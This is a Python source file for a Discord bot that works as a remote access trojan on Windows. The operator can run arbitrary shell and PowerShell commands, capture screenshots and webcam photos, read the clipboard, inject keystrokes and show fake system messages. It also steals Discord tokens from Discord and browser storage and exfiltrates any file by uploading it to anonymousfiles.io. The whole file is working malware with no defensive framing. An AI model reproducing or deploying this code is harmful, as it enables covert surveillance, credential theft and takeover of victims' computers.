# THIS CODE HAS BEEN CREATED SPECIFICALLY FOR WINDOWS COMPUTERS
# CERTAIN FUNCTIONS MIGHT NOT WORK ON OTHER SYSTEMS

import subprocess
import discord, platform, asyncio, tempfile, os, pathlib, pyscreenshot, cv2, aiohttp, win10toast, re
from discord.ext import commands, tasks
from keyboard import write

loop = asyncio.ProactorEventLoop()
asyncio.set_event_loop(loop)

prefix = "$"
bot = commands.Bot(command_prefix=prefix, help_command=commands.DefaultHelpCommand(no_category = 'Commands'))

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=platform.node()))
    print("Ready.")

@bot.command(brief="Gets the computer's IP address.", description="Makes a cURL request to ipinfo.io/ip to retrieve the computer's public IP address.")
async def ip(ctx):
    await send_subprocess(ctx, "curl http://ipinfo.io/ip -s")

@bot.command(brief="Shows a list of all visible networks.", description='Runs "netsh wlan show network" to retrieve all visible networks.')
async def network(ctx):
    await send_subprocess(ctx, "netsh wlan show network")

@bot.command(brief="Gets information about the current user.", description='Runs "net user %username%" to retrieve information about the current user.')
async def user(ctx):
    await send_subprocess(ctx, "net user %username%")

@bot.command(brief="Runs a command or program.", description="Runs a command or program. Usage: $run explorer.exe")
async def run(ctx, command):
    await send_subprocess(ctx, command)

@bot.command(brief="Runs a PowerShell command.", description='Runs a PowerShell command. Usage: $ps "echo Hello World"')
async def ps(ctx, command):
    await send_subprocess(ctx, "@PowerShell " + command)

@bot.command(brief="Lists all of the currently running processes.", description='Runs "tasklist" to retrieve all of the currently running processes.')
async def tasklist(ctx):
    await send_subprocess(ctx, "tasklist")

@bot.command(brief="Forcefully kills a process.", description='Runs "taskkill /f /im" to forcefully kill a process. Usage: $kill zoom.exe')
async def kill(ctx, process):
    await send_subprocess(ctx, "taskkill /f /im " + process)

@bot.command(brief="Lists a tree of all files and subdirectories in a directory.", description=r'Runs "tree /f /a" to list all files and subdirectories. Usage: $tree "C:\Program Files"')
async def tree(ctx, path=str(pathlib.Path.home())):
    await send_subprocess(ctx, 'tree /f /a "' + path + '"')

@bot.command(brief="Gets the content of the clipboard.", description='Runs "Get-Clipboard" in PowerShell to retrieve the information stored in the clipboard.')
async def clipboard(ctx):
    await send_subprocess(ctx, "@PowerShell Get-Clipboard")

@bot.command(brief="Lists all conected drives and their capacity.", description='Runs "wmic logicaldisk get caption, volumename, freespace, size" to retrieve the disk information.')
async def drives(ctx):
    await send_subprocess(ctx, "wmic logicaldisk get caption, volumename, freespace, size")

@bot.command(brief="Takes a screenshot of the computer's screen.", description="Takes a screenshot of the computer's screen.")
async def screenshot(ctx):
    img = pyscreenshot.grab()
    filename = tempfile._get_default_tempdir() + next(tempfile._get_candidate_names()) + ".png"
    img.save(filename)
    await ctx.send(file=discord.File(filename))
    os.remove(filename)

@bot.command(brief="Takes a photo using the computer's webcam.", description="Takes a photo using the computer's webcam.")
async def webcam(ctx, cam=0):
    filename = tempfile._get_default_tempdir() + next(tempfile._get_candidate_names()) + ".png"
    camera = cv2.VideoCapture(int(cam))
    await asyncio.sleep(3)
    rv, img = camera.read()
    cv2.imwrite(filename, img)
    del (camera)
    await ctx.send(file=discord.File(filename))
    os.remove(filename)

@bot.command(brief="Downloads a file or directory from the computer.", description=r'Provides the user with a download link to the desired file or directory by hosting it on anonymousfiles.io. Usage: $download "C:\sample.txt"')
async def download(ctx, path):
    async with aiohttp.ClientSession() as session:
        async with session.post("https://api.anonymousfiles.io", data={'file': open(path, 'rb')}) as response:
            to_send = await response.json()
    filename = tempfile._get_default_tempdir() + next(tempfile._get_candidate_names()) + ".txt"
    file = open(filename, "w+", newline="")
    file.write(to_send["url"])
    file.close()
    await ctx.send(file=discord.File(filename))
    os.remove(filename)

@bot.command(brief="Shows a notification.", description='Shows a notification on the computer. Does not work if focus assist is enabled.')
async def notify(ctx, text):
    t = win10toast.ToastNotifier()
    t.show_toast("System Message", text)

@bot.command(brief="Shows a message box.", description='Displays a custom message box using PowerShell. Usage: $msg "Hello World"')
async def msg(ctx, text):
    await ps(ctx, "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('" + text + "','Message','Ok','Info')")

@bot.command(brief="Types a character or string.", description='Types a character or string. Usage: $type "Hello World"')
async def type(ctx, text):
    write(text)
    await save_out(ctx, text)

@bot.command(brief="Grabs the Discord token.", description="Looks for the user token in Discord, Chrome, Opera, Brave and Yandex")
async def token(ctx):
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        "Discord": roaming + "\\Discord", "Discord Canary": roaming + "\\discordcanary",
        "Discord PTB": roaming + "\\discordptb", "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
        "Opera": roaming + "\\Opera Software\\Opera Stable", "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default"
    }
    msg = ""
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        msg += f"\n{platform}:\n\n"
        tokens = grab_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                msg += f"{token}\n"
        else:
            msg += "No tokens found."
    if msg[0] == "\n":
        msg = msg[1:]
    await save_out(ctx, msg)

async def send_subprocess(ctx, command):
    proc = await asyncio.subprocess.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=subprocess.STDOUT)
    stdout = (await proc.communicate())[0]
    await save_out(ctx, stdout.decode(errors="ignore"))

async def save_out(ctx, text):
    filename = tempfile._get_default_tempdir() + next(tempfile._get_candidate_names()) + ".txt"
    file = open(filename, "w+", newline="", encoding="utf-8")
    file.write(text)
    file.close()
    await ctx.send(file=discord.File(filename))
    os.remove(filename)

def grab_tokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

bot.run("TOKEN GOES HERE...")